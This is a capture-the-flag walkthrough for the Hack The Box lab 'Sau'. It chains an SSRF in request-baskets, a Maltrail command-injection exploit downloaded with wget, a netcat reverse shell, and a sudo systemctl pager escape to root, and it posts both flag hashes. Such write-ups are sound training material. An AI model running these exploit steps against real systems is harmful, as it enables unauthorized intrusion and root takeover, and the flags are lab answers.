## Task 1 : Which is the highest open TCP port on the target machine?

Run an nmap scan on the target

```
sudo nmap -sV -Pn -T4 -oA initial_scan 10.129.229.26
```

![[Pasted image 20260216024608.png]]

> Answer : 55555

---

## Task 2 : What is the name of the open source software that the application on 55555 is "powered by"?

Visit the web address

```
http://10.129.229.26:55555
```

![[Pasted image 20260216024950.png]]

> Answer : request-baskets

---

## Task 3 : What is the version of request-baskets running on Sau?


![[Pasted image 20260216025120.png]]

>  Answer : 1.2.1

---

## Task 4 : What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?

A google search of "request-baskets version 1.2.1 CVE" returns the result. 

I visited this [website](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-27163)

![[Pasted image 20260216025505.png]]

> Answer : CVE-2023-27163

---

## Task 5 : What is the name of the software that the application running on port 80 is "powered by"?

By default, http://10.129.229.26:80 port 80 webpage cannot be directly accessed. Hence, we need to make use of Server-Side Request Forgery. We pretend that we are the server and send the request to visit port 80 webpage for access.

Based on this [github](https://github.com/mathias-mrsn/request-baskets-v121-ssrf), I downloaded this exploit.py

![[Pasted image 20260216034128.png]]

Using the format of 

```
python3 exploit.py (public_url) (targeted_url)
```

![[Pasted image 20260216034240.png]]

After successfully running this exploit, visiting http://10.129.229.26:55555/zlzxcu now sends me to http://10.129.229.26:80

![[Pasted image 20260216034519.png]]

The webpage tells me that it is powered by Maltrail

> Answer : Maltrail

---

## Task 6 : There is an unauthenticated command injection vulnerability in MalTrail v0.53. What is the relative path on the webserver targeted by this exploit? 

Googling "Maltrail v0.53 vulnerability" returns this [RCE github exploit](https://github.com/spookier/Maltrail-v0.53-Exploit/tree/main). 

![[Pasted image 20260218092558.png]]

We can see that the exploit targets the /login field.

> Answer : /login

---

## Task 7 : What system user is the Mailtrack application running as on Sau?

We attempt to achieve a reverse shell.

Download the [RCE github exploit](https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py) into my attacker under the name "RCEexploit.py"

```
wget -O RCEexploit.py https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
```

![[Pasted image 20260218093008.png]]

Next, find out our listener IP address.
```
ip a
```

![[Pasted image 20260218093052.png]]

Set up a netcat listener to catch the reverse shell connection.
![[Pasted image 20260218093134.png]]

Finally, run the exploit using the given format : 
```
python3 RCEexploit.py [listener IP] [listener port no] [target_url]
```

![[Pasted image 20260218093300.png]]

Our netcat listener catches a connection and we achieve a reverse shell.

![[Pasted image 20260218093354.png]]

> Answer : Puma

---

## Submit User Flag : Submit the flag located in the puma user's home directory.

User flag can be found at /home/puma/user.txt

![[Pasted image 20260218093545.png]]

> User flag : 2ecc166170a01615fbf15ab176aea05a

---

## Task 9 : What is the full path to the binary (without arguments) the puma user can run as root on Sau?

```
sudo -l
```

To find out what sudo commands user puma is allowed to run.

![[Pasted image 20260218093830.png]]

> Answer : /usr/bin/systemctl

---

## Task 10 : What is the full version string for the instance of systemd installed on Sau?

After visiting the [systemctl manual page](https://manpages.debian.org/stretch/systemd/systemctl.1.en.html), 

```
systemctl --version
```

![[Pasted image 20260218094733.png]]

> Answer : systemd 245 (245.4-4ubuntu3.22)

---

## Task 11 : What is the 2023 CVE ID for a local privilege escalation vulnerability in this version of systemd?

Googling "systemd 245 (245.4-4ubuntu3.22) cve" gives this [CVE result](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2023-26604).

![[Pasted image 20260218095142.png]]

> Answer : CVE-2023-26604 

---

# Submit Root Flag : Submit the flag located in the root user's home directory.

Based on this [sploitus](https://sploitus.com/exploit?id=EDB-ID:51674) page, I followed the instructions

![[Pasted image 20260218100225.png]]

```
sudo /usr/bin/systemctl status trail.service
```

This opens a pager (less)

```
!/bin/sh
```

Type this in the less pager and root access is achieved

![[Pasted image 20260218100145.png]]

Root.txt can be found at /root/root.txt

![[Pasted image 20260218100541.png]]
> Root flag : 91bc5e1082ab12c8d3788f346dd25421

---

